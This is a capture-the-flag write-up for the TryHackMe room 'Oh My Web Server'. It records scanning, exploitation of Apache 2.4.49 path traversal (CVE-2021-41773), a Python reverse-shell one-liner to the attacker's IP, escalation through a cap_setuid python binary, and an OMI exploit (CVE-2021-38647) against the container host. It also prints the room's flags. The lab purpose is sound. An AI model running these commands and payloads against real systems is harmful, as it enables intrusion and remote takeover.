@@ -1,0 +1,284 @@
+------------------------------OH MY WEB SERVER TRYHACKME ----------------------------
+Ip: 10.10.14.54
+Level: Mediuml
+Link: https://tryhackme.com/room/ohmyweb
+
+
+###################################################Enumeration-------------------------
+We start with a nmap scan and found 2 open ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 e0:d1:88:76:2a:93:79:d3:91:04:6d:25:16:0e:56:d4 (RSA)
+|   256 91:18:5c:2c:5e:f8:99:3c:9a:1f:04:24:30:0e:aa:9b (ECDSA)
+|_  256 d1:63:2a:36:dd:94:cf:3c:57:3e:8a:e8:85:00:ca:f6 (ED25519)
+80/tcp open  http    Apache httpd 2.4.49 ((Unix))
+|_http-title: Consult - Business Consultancy Agency Template | Home
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.49 (Unix)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+
+After that we doid not see nothing on the website so we launcxh nikto scan
+
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          10.10.14.54
++ Target Hostname:    10.10.14.54
++ Target Port:        80
++ Start Time:         2025-10-02 00:12:57 (GMT0)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.49 (Unix)
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ Apache/2.4.49 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
++ OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD, TRACE .
++ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
++ 8881 requests: 0 error(s) and 5 item(s) reported on remote host
++ End Time:           2025-10-02 00:44:01 (GMT0) (1864 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+
+
+
+Nothing found so nuclei scan
+
+ nuclei -u http://10.10.14.54/           
+
+                     __     _
+   ____  __  _______/ /__  (_)
+  / __ \/ / / / ___/ / _ \/ /
+ / / / / /_/ / /__/ /  __/ /
+/_/ /_/\__,_/\___/_/\___/_/   v3.4.10
+
+		projectdiscovery.io
+
+[INF] Your current nuclei-templates v10.2.8 are outdated. Latest is v10.2.9
+[INF] Successfully updated nuclei-templates (v10.2.9) to /home/thierry/.local/nuclei-templates. GoodLuck!
+
+Nuclei Templates v10.2.9 Changelog
+┌───────┬───────┬──────────┬─────────┐
+│ TOTAL │ ADDED │ MODIFIED │ REMOVED │
+├───────┼───────┼──────────┼─────────┤
+│ 3658  │ 186   │ 3472     │ 0       │
+└───────┴───────┴──────────┴─────────┘
+[WRN] Found 1 templates with syntax error (use -validate flag for further examination)
+[INF] Current nuclei version: v3.4.10 (latest)
+[INF] Current nuclei-templates version: v10.2.9 (latest)
+[INF] New templates added in latest release: 182
+[INF] Templates loaded for current scan: 8501
+[INF] Executing 8299 signed templates from projectdiscovery/nuclei-templates
+[WRN] Loading 202 unsigned templates for scan. Use with caution.
+[INF] Targets loaded for current scan: 1
+[INF] Templates clustered: 1798 (Reduced 1687 Requests)
+[INF] Using Interactsh Server: oast.live
+[CVE-2021-41773:RCE] [http] [high] http://10.10.14.54/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh
+[http-trace:trace-request] [http] [info] http://10.10.14.54/
+....
+
+
+Now we decide to search for this CVE and found
+
+Link: https://github.com/thehackersbrain/CVE-2021-41773
+
+Now let us exploit it
+
+git clone https://github.com/thehackersbrain/CVE-2021-41773.git                         
+Cloning into 'CVE-2021-41773'...
+remote: Enumerating objects: 10, done.
+remote: Counting objects: 100% (10/10), done.
+remote: Compressing objects: 100% (9/9), done.
+remote: Total 10 (delta 1), reused 10 (delta 1), pack-reused 0 (from 0)
+Receiving objects: 100% (10/10), 4.39 MiB | 3.89 MiB/s, done.
+Resolving deltas: 100% (1/1), done.
+                                                                                                                                                                             
+┌──(thierry㉿thierry)-[~/Desktop/rooms/Tryhackme/ohmyweb]
+└─$ cd CVE-2021-41773 
+                                                                                                                                                                             
+┌──(thierry㉿thierry)-[~/…/rooms/Tryhackme/ohmyweb/CVE-2021-41773]
+└─$ ls
+exploit.py  README.md  screenshots
+                                                                                                                                                                             
+┌──(thierry㉿thierry)-[~/…/rooms/Tryhackme/ohmyweb/CVE-2021-41773]
+└─$ python3 exploit.py -t 10.10.14.54                    
+--------------------------------------------------------
+|                Apache2 2.4.49 - Exploit              |
+--------------------------------------------------------
+>>> id
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+>>> pwd
+/bin
+
+
+After triying if command i get this 
+
+
+>>> if
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>500 Internal Server Error</title>
+</head><body>
+<h1>Internal Server Error</h1>
+<p>The server encountered an internal error or
+misconfiguration and was unable to complete
+your request.</p>
+<p>Please contact the server administrator at 
+ you@example.com to inform them of the time this error occurred,
+ and the actions you performed just before this error.</p>
+<p>More information about this error may be available
+in the server error log.</p>
+</body></html>
+
+
+So i decide to test a reverse shell and bing i get a real shell
+
+
+>>> python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.127.125",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
+
+
+rlwrap nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [10.11.127.125] from (UNKNOWN) [10.10.14.54] 36894
+daemon@4a70924bafa0:/bin$ 
+
+
+Let us check for env variable
+
+daemon@4a70924bafa0:/$ env
+env
+HTTP_ACCEPT_ENCODING=identity
+SERVER_NAME=10.10.14.54
+SCRIPT_NAME=/cgi-bin/../../../../../../../../../../bin/sh
+GATEWAY_INTERFACE=CGI/1.1
+SERVER_SOFTWARE=Apache/2.4.49 (Unix)
+DOCUMENT_ROOT=/usr/local/apache2/htdocs
+PWD=/
+REQUEST_URI=/cgi-bin/.%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/bin/sh
+SERVER_SIGNATURE=
+REQUEST_SCHEME=http
+QUERY_STRING=
+CONTEXT_DOCUMENT_ROOT=/usr/local/apache2/cgi-bin/
+REMOTE_PORT=48992
+SERVER_ADMIN=you@example.com
+HTTP_HOST=10.10.14.54
+SERVER_ADDR=172.17.0.2
+HTTP_USER_AGENT=python-urllib3/2.5.0
+CONTEXT_PREFIX=/cgi-bin/
+SHLVL=1
+CONTENT_LENGTH=259
+LC_CTYPE=C.UTF-8
+SERVER_PROTOCOL=HTTP/1.1
+SERVER_PORT=80
+SCRIPT_FILENAME=/bin/sh
+REMOTE_ADDR=10.11.127.125
+PATH=/usr/local/apache2/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+REQUEST_METHOD=POST
+OLDPWD=/home
+_=/usr/bin/env
+
+
+We see now that we have Ds_store
+
+
+daemon@4a70924bafa0:/usr/local/apache2/htdocs/assets$ ls -la
+ls -la
+total 36
+drwxr-xr-x 6 root root 4096 Nov  9  2019 .
+drwxr-xr-x 1 root root 4096 Feb 23  2022 ..
+-rw-r--r-- 1 root root 8196 Nov  9  2019 .DS_Store
+drwxr-xr-x 2 root root 4096 Nov  9  2019 css
+drwxr-xr-x 2 root root 4096 Sep 21  2019 fonts
+drwxr-xr-x 3 root root 4096 Oct  8  2019 images
+drwxr-xr-x 3 root root 4096 Nov  9  2019 js
+daemon@4a70924bafa0:/usr/local/apache2/htdocs/assets$
+
+Let us launch linpeas to see 
+
+Files with capabilities (limited to 50):
+/usr/bin/python3.7 = cap_setuid+ep
+
+
+We found this mlet us use it to do privesc
+
+daemon@4a70924bafa0:/tmp$ /usr/bin/python3.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+<c 'import os; os.setuid(0); os.system("/bin/bash")'
+root@4a70924bafa0:/tmp# cd /root
+cd /root
+root@4a70924bafa0:/root# ls
+ls
+user.txt
+root@4a70924bafa0:/root# cat user.txt
+cat user.txt
+THM{eacffefe1d2aafcc15e70dc2f07f7ac1}
+
+
+------------------------------privilege escalation -----------------------------------
+root@4a70924bafa0:/tmp# ifconfig
+ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
+        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
+        RX packets 102  bytes 7777 (7.5 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 62  bytes 64112 (62.6 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+We see that we are .2 let us scan the 100 host 
+
+root@4a70924bafa0:/tmp# ./nmap -sn 172.17.0.0-100
+./nmap -sn 172.17.0.0-100
+
+Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2025-10-03 07:48 UTC
+Cannot find nmap-payloads. UDP payloads are disabled.
+Nmap scan report for ip-172-17-0-1.eu-west-1.compute.internal (172.17.0.1)
+Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
+Host is up (0.000034s latency).
+MAC Address: 02:42:99:09:AE:CA (Unknown)
+Nmap scan report for 4a70924bafa0 (172.17.0.2)
+Host is up.
+Nmap done: 101 IP addresses (2 hosts up) scanned in 2.57 seconds
+root@4a70924bafa0:/tmp# 
+
+
+
+Now let us scan the .1 host
+root@4a70924bafa0:/tmp# ./nmap -p- 172.17.0.1 -vv
+./nmap -p- 172.17.0.1 -vv
+bash: ./nmap: Permission denied
+root@4a70924bafa0:/tmp# chmod +x nmap
+chmod +x nmap
+root@4a70924bafa0:/tmp# ./nmap -p- 172.17.0.1 -vv
+Discovered open port 22/tcp on 172.17.0.1
+Discovered open port 80/tcp on 172.17.0.1
+Discovered open port 5986/tcp on 172.17.0.1
+
+So let us search for exploit on this port
+
+i found this link: https://github.com/CyberMonitor/CVE-2021-38648/blob/main/CVE-2021-38647.py
+Exploit ID: CVE-2021-38647
+
+
+CVE-2021-38647.py: error: the following arguments are required: -t/--TargetIP
+root@4a70924bafa0:/tmp# /usr/bin/python3.7 CVE-2021-38647.py -t 172.17.0.1 -p 5986 -c whoami
+                        /usr/bin/python3.7 CVE-2021-38647.py -t 172.17.0.1 -p 5986 -c whoami
+<7 CVE-2021-38647.py -t 172.17.0.1 -p 5986 -c whoami
+root
+
+root@4a70924bafa0:/tmp# /usr/bin/python3.7 CVE-2021-38647.py -t 172.17.0.1 -p 5986 -c 'ls /root'
+                        /usr/bin/python3.7 CVE-2021-38647.py -t 172.17.0.1 -p 5986 -c 'ls /root'
+<E-2021-38647.py -t 172.17.0.1 -p 5986 -c 'ls /root'
+root.txt
+snap
+
+root@4a70924bafa0:/tmp# /usr/bin/python3.7 CVE-2021-38647.py -t 172.17.0.1 -p 5986 -c 'cat /root/root.txt'
+                        /usr/bin/python3.7 CVE-2021-38647.py -t 172.17.0.1 -p 5986 -c 'cat /root/root.txt'
+<47.py -t 172.17.0.1 -p 5986 -c 'cat /root/root.txt'
+THM{7f147ef1f36da9ae29529890a1b6011f}
+
+root@4a70924bafa0:/tmp#
+
